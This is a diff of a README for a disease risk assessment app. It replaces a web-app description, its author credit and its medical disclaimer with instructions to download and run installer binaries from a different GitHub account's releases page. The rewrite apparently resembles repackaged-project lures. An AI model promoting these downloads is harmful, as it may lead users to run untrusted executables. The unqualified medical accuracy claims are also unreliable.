@@ -1,94 +1,91 @@
-# 🏥 AI-Driven Disease Risk Assessment Platform
+# 🩺 Medical-Disease-Risk-Assessment-System - Assess Your Health Risks Easily
 
-An advanced healthcare decision-support system powered by Machine Learning models to assess and predict the risk of multiple diseases using patient clinical and lifestyle data. This platform enhances early risk detection and supports doctors and individuals in informed decision-making.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Find%20Your%20Health%20Risks-blue.svg)](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
 
-## 🚀 Key Features
+## 🚀 Getting Started
 
-- ✔ Multi-Disease Assessment (Diabetes, CKD, Parkinson’s — expanding soon)
-- ✔ Explainable AI – Clinical interpretation for every result
-- ✔ Evidence-based health recommendations
-- ✔ Dynamic UI with Light/Dark Themes
-- ✔ Secure Medical PDF Analysis (AI Extract + Insights)
-- ✔ Real-Time Confidence-Based Risk Evaluation
+Welcome to the Medical Disease Risk Assessment System! This application helps you assess your risk for various medical conditions using advanced AI technology. You can evaluate your risk for diseases such as Diabetes, Chronic Kidney Disease (CKD), and Parkinson’s disease. 
 
-## 🩺 Supported Disease Modules
+This guide walks you through the steps to download and run the application. You do not need any programming experience.
 
-| Disease | Status | Risk Analysis | Interpretation | Recommendations |
-|--------|:------:|:-------------:|:--------------:|:----------------:|
-| Diabetes Mellitus | ✔ | ✔ | ✔ | ✔ |
-| Chronic Kidney Disease (CKD) | ✔ | ✔ | ✔ | ✔ |
-| Parkinson’s Disease | ✔ | ✔ | ✔ | ✔ |
-| Medical Document Analysis | ✔ | ✔ | ✔ | ✔ |
+## 📦 What You Need
 
-## 📊 Demo Screenshots
+Before you start, ensure you have:
 
+- A computer running Windows, macOS, or Linux.
+- At least 200 MB of free space.
+- A stable internet connection.
 
-- Diabetes Assessment (Form & Results)
-  ![WhatsApp Image 2025-11-19 at 23 03 30](https://github.com/user-attachments/assets/7bf06f09-08a9-44ae-a0fe-a20ac13e7be4)
-  ![WhatsApp Image 2025-11-19 at 23 04 05](https://github.com/user-attachments/assets/3bf410d8-247f-4ad7-a186-fb20e1dc7736)
-![WhatsApp Image 2025-11-19 at 23 04 21](https://github.com/user-attachments/assets/09871838-5c50-4d1e-a913-cb858d7b79a3)
-![WhatsApp Image 2025-11-19 at 23 05 06](https://github.com/user-attachments/assets/fedb0801-d76c-4a25-a990-d17ea74ef67a)
-![WhatsApp Image 2025-11-19 at 23 05 37](https://github.com/user-attachments/assets/b952020f-3f0a-42ff-a415-5eb7abd3e322)
-![WhatsApp Image 2025-11-19 at 23 05 47](https://github.com/user-attachments/assets/0b8d1b3b-d14f-41e6-88b6-81514960c2e2)
+## 🔗 Download & Install
 
+To download the application, visit the link below:
 
-- CKD Assessment
-![WhatsApp Image 2025-11-19 at 20 22 50](https://github.com/user-attachments/assets/ee6acfe2-c496-439b-a4df-87b39b1bb4a3)
+[Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
 
-- Parkinson’s Assessment
-![WhatsApp Image 2025-11-19 at 20 22 20](https://github.com/user-attachments/assets/777cb985-9097-497c-803b-2ee8f461dfaa)
+Once you visit the page, look for the latest version titled “Medical Disease Risk Assessment System”. Click on the version, then download the appropriate file for your operating system. 
 
-![WhatsApp Image 2025-11-19 at 20 22 34](https://github.com/user-attachments/assets/83dad17f-30b4-426a-8597-ec78577fd03f)
+### 📥 Steps to Download:
 
-- Medical PDF Analyzer Module
+1. Click on [Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases).
+2. Locate the latest version of the application.
+3. Download the file that matches your operating system.
+4. Remember where you save this file on your computer.
 
-## 🧠 Machine Learning & Tech Stack
+## 🛠️ How to Run the Application
 
-| Layer | Tools Used |
-|------|------------|
-| Frontend | React.js + Tailwind CSS |
-| Backend | FastAPI (Python) / Node.js |
-| ML Models | Logistic Regression, Random Forest, Ensemble Models |
-| Explanation Engine | SHAP / Clinical Logic Rules |
-| Deployment | Vercel / Render / Docker (Planned) |
+After downloading the file:
 
-## 💻 Setup & Installation
+- **For Windows:**
+  1. Locate the downloaded `.exe` file.
+  2. Double-click on it to run the installer. 
+  3. Follow the on-screen instructions to complete the installation.
+  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the Medical Disease Risk Assessment System to your Applications folder.
+  3. Open the application from your Applications folder.
 
-```bash
-# Clone Repository
-git clone https://github.com/amitabh-7t/Medical-Disease-Risk-Assessment-System
-cd Medical-Disease-Risk-Assessment-System
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to the folder where you downloaded the file.
+  3. Use the command `chmod +x [filename]` (replace `[filename]` with the downloaded file name).
+  4. Run the application with `./[filename]`.
 
-# Install dependencies
-npm install
+## 🧠 How to Use the Application
 
-# Run app locally
-npm run dev
-```
+1. Open the Medical Disease Risk Assessment System.
+2. Fill in the required information, such as your age, gender, and medical history.
+3. Click on the “Assess Risk” button.
+4. Receive insights on your health risks and recommendations based on your input.
 
-> Backend API integration instructions will be added as modules are finalized.
+## 🔍 Features
 
-## 🔮 Future Enhancements
+- **Multi-disease Risk Assessment:** Evaluate your risk for Diabetes, CKD, and Parkinson’s disease all in one place.
+- **AI-powered Insights:** Get accurate assessments backed by machine learning algorithms.
+- **User-friendly Interface:** Navigate easily through the application with a straightforward layout.
+- **Secure Data Handling:** Your medical information remains private and secure.
 
-- Automated medical OCR for report extraction
-- Doctor Dashboard + Patient History Tracking
-- Multi-Disease Correlation Engine
-- PDF/Email export for results
-- Improved Risk Scoring using ensemble predictive models
+## ⚙️ Troubleshooting
 
-## ⚠ Medical Disclaimer
+If you encounter issues:
 
-This application is intended **strictly for educational & research purposes**.  
-It is **not** a replacement for clinical diagnosis or professional medical advice.
+- Ensure that your system meets the requirements listed above.
+- Make sure you have the latest version of the application downloaded.
+- Restart the application if it is not responding.
 
-## 👑 Author
+If problems persist, check the [Issues](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/issues) section on our GitHub page for more help.
 
-**Amitabh Thakur**  
-Founder — *Humans Care Foundation*  
-AI/ML Engineer | Innovator | Healthcare Future Builder  
-🌐 Bangalore, India
+## 🤝 Get Support
 
-## ⭐ Contribution
+For further assistance, feel free to reach out via the following:
 
-We welcome developers, medical experts & AI enthusiasts  
-to collaborate and expand this healthcare intelligence system.
+- Open an issue on our [GitHub page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/issues).
+- Join our community on social platforms linked on the GitHub page.
+
+## 🔗 Useful Links
+
+- [Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
+- [Documentation](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/wiki)
+- [GitHub Repository](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System)
+
+Thank you for using the Medical Disease Risk Assessment System. Your health is important, and we are here to assist you in making informed healthcare decisions.
